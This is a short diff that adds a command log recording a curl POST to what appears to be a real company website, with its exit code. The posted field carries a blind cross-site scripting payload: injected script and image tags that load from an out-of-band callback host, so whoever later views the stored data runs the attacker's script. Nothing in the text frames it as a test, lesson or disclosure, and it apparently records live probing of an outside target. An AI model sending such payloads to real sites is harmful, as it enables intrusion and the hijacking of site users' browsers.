@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null -X POST -d 'zzz="><script src=http://oob849c1554d2cf.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/x.js></script><img src=http://oob849c1554d2cf.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/i>' https://www.infinitycapital.bh/
+# exit_code: 0
+# ---
+
